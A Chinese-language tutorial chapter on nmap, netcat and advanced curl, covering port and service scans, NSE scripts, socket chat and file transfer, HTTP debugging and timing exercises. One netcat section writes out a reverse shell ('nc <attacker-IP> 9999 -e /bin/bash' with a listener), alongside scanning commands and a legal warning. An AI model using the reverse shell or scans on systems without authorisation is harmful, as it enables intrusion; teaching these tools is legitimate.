# Ch 17 — nmap / netcat / curl 進階

> 目標：精通三個瑞士刀：nmap（掃 port + 服務）、netcat（任意 socket 通訊）、curl 進階（HTTP debug）。

## nmap

「網路 scanner」 — 探測主機、port、服務。

### 基本掃描

```bash
nmap example.com                # 預設 port scan（top 1000 ports）
nmap -p 80,443 example.com      # 指定 port
nmap -p 1-65535 example.com     # 全部 port（很慢）
nmap -p- example.com            # 同上
nmap -F example.com             # fast (top 100 port)
nmap 192.168.1.0/24             # 整個網段
```

### 掃描類型

```bash
nmap -sS target    # SYN scan（半開，default for sudo）
nmap -sT target    # TCP connect scan（完整握手，default 無 sudo）
nmap -sU target    # UDP scan（慢）
nmap -sn target    # Ping scan（不掃 port，只看 host alive）
nmap -Pn target    # 不 ping，直接掃（host 擋 ICMP 時用）
```

### 服務探測

```bash
nmap -sV example.com        # 版本探測
nmap -O example.com         # OS 探測（要 root）
nmap -A example.com         # aggressive（all of above）
```

範例輸出：

```
$ nmap -sV scanme.nmap.org
Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-28 12:00 UTC
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.012s latency).
Not shown: 996 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux)
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
9929/tcp  open  nping-echo Nping echo
31337/tcp open  tcpwrapped
```

看到 port + service + version。

### NSE（Nmap Scripting Engine）

```bash
nmap --script ssl-enum-ciphers -p 443 example.com   # 列 TLS cipher
nmap --script vuln example.com                       # 已知 vulnerability
nmap --script http-headers example.com               # 看 HTTP headers
nmap --script-help "ssl-*"                           # 列所有 SSL script
```

幾百個 script 在 `/usr/share/nmap/scripts/`。

### 法律警告

**亂掃別人 server 是違法的**（電腦犯罪法）。

- 自己的 server / VPS / LAN：OK
- `scanme.nmap.org`：nmap 官方提供的測試 target，OK
- 別人的 production：**不要**

## netcat (nc)

「**任意 TCP / UDP socket 操作工具**」。

### 連線

```bash
# TCP 連線（取代 telnet）
nc example.com 80
GET / HTTP/1.0
Host: example.com

(empty line)

# UDP
nc -u example.com 53
```

### Listen

```bash
# 開個 TCP server，listen port 9999
nc -l 9999

# 另一台機器連
nc <server-IP> 9999
```

兩台機器之間的「**簡易聊天**」。或傳檔：

```bash
# Receiver
nc -l 9999 > received.txt

# Sender
nc <receiver-IP> 9999 < file.txt
```

### Port 測試

```bash
# 測試對方 port 開不開
nc -zv example.com 443
# Connection to example.com 443 port [tcp/https] succeeded!

nc -zv example.com 9999
# nc: connect to example.com (93.184.216.34) port 9999 (tcp) failed: Connection refused
```

`-z` zero-IO（只測連線）、`-v` verbose。

### 反向 shell（pentest 工具）

```bash
# Attacker
nc -lvnp 9999

# Victim (執行)
nc <attacker-IP> 9999 -e /bin/bash
```

**這在 production 是入侵工具，學習用 OK，別亂用**。

### nc vs ncat

`nc` 有多版本：

- traditional `nc`
- `netcat-openbsd`（多數 Linux 預設，沒 `-e`）
- `ncat`（Nmap 專案，更新版，含 SSL 支援）

```bash
sudo apt install ncat
ncat --ssl example.com 443    # TLS-aware nc
```

## curl 進階

過 Ch 12 簡單帶過。深入用法：

### Verbose / Debug

```bash
curl -v https://example.com           # 印 request + response headers
curl -vv https://example.com          # 加 SSL info
curl --trace-ascii out.txt https://example.com   # 完整 trace 寫檔
```

### Method / Body

```bash
curl -X POST https://example.com/api \
     -H "Content-Type: application/json" \
     -d '{"key": "value"}'

curl -X PUT https://example.com/resource/1 -d @file.json

curl -X DELETE https://example.com/resource/1
```

### Output 控制

```bash
curl -o output.html https://example.com    # 寫到 output.html
curl -O https://example.com/file.zip       # 用 server 提供的檔名
curl -L https://bit.ly/xxx                 # follow redirect
curl -s https://example.com                # silent（沒 progress）
curl -s -o /dev/null -w "%{http_code}\n" https://example.com  # 只印 status code
```

### Timeout

```bash
curl --connect-timeout 5 --max-time 10 https://example.com
```

### Cookie

```bash
curl -c cookies.txt -b cookies.txt https://example.com  # 寫 + 讀 cookie
curl -b "session=abc123" https://example.com             # 直接設
```

### TLS / SSL

```bash
curl --cacert ca.crt https://example.com
curl --cert client.crt --key client.key https://example.com  # mTLS
curl -k https://expired.badssl.com   # 忽略 SSL error（不安全）
curl --resolve example.com:443:1.2.3.4 https://example.com   # 強制 IP（不查 DNS）
```

### HTTP 版本

```bash
curl --http1.1 https://example.com
curl --http2 https://example.com
curl --http3 https://example.com   # 需要 curl 編 HTTP/3 支援
```

### 同時多個 URL

```bash
curl -O https://example.com/file1.zip -O https://example.com/file2.zip
```

### Curl 寫 script 取 metric

```bash
curl -o /dev/null -s -w "
DNS:        %{time_namelookup}
TCP:        %{time_connect}
TLS:        %{time_appconnect}
First byte: %{time_starttransfer}
Total:      %{time_total}
" https://example.com
```

```
DNS:        0.012
TCP:        0.085
TLS:        0.232
First byte: 0.305
Total:      0.310
```

每階段時間，**比 Wireshark 快很多看 timing**。

## 一個常見誤解：「nmap 只是 hacker 工具」

**錯**。nmap 是 sysadmin / DevOps 標配：

- 看自己 server 開哪些 port（安全 audit）
- 找 LAN 上有什麼設備（網段 scan）
- 監控特定 service 在不在
- 測試 firewall 規則

**「掃自己 / 自己授權的東西」永遠合法**。

## 一個常見誤解：「nc 只是 telnet 替代」

**錯**。nc 比 telnet 強：

- 雙向 binary / 文字
- listen mode
- UDP
- 端口掃描

**TCP 任意 client / server，靠 nc 1 行能搞定**。

## 一個常見誤解：「curl 只能 GET HTTP」

**錯**。curl 支援 20+ protocol：

- HTTP / HTTPS / HTTP/2 / HTTP/3
- FTP / FTPS
- SCP / SFTP
- SMTP / IMAP
- LDAP
- ...

「**curl 能取代 70% 的 protocol client 工具**」。

## 動手練習

**1. nmap 你的 VPS**

```bash
# 看自己 VPS 開哪些 port
nmap <VPS-IP>
nmap -sV <VPS-IP>
```

通常 22 開（SSH），可能 80 / 443（如果有 web）。

**2. nmap LAN**

```bash
# 掃同網段（可能慢）
nmap -sn 192.168.1.0/24
```

看家裡 / 辦公室有多少設備。

**3. nc 簡單 chat**

```bash
# 開兩個 terminal

# Terminal A
nc -l 9999

# Terminal B
nc localhost 9999

# 在 B 打字 → A 看到，反之亦然
```

**4. nc 傳檔**

```bash
# Receiver
nc -l 9999 > received.txt

# Sender
nc localhost 9999 < /etc/hosts
```

確認 `received.txt` 跟 `/etc/hosts` 一樣。

**5. curl 進階**

```bash
# 看 timing
curl -o /dev/null -s -w "DNS: %{time_namelookup}\nTCP: %{time_connect}\nTLS: %{time_appconnect}\nTotal: %{time_total}\n" https://example.com

# POST JSON
curl -X POST https://httpbin.org/post -H "Content-Type: application/json" -d '{"key":"value"}'

# Follow redirect
curl -IL https://bit.ly/something

# 限速下載
curl --limit-rate 100K -O https://example.com/big-file.zip
```

**6. nmap script**

```bash
nmap --script ssl-enum-ciphers -p 443 example.com
```

看 example.com 支援哪些 TLS cipher。

## 自我檢核

- [ ] nmap 基本掃描 + 服務探測 + NSE script 用過
- [ ] 知道亂掃別人 server 違法
- [ ] nc 4+ 種用法（連線 / listen / 傳檔 / port test）
- [ ] curl 進階：method / verbose / timing / TLS option
- [ ] 用 curl 寫過 timing 分析 script

Part 4 結束。練習 B 用這些工具 debug 5 個常見網路問題。

→ [練習 B：debug 5 個常見網路問題](./practice-b-debug-5-problems.md)
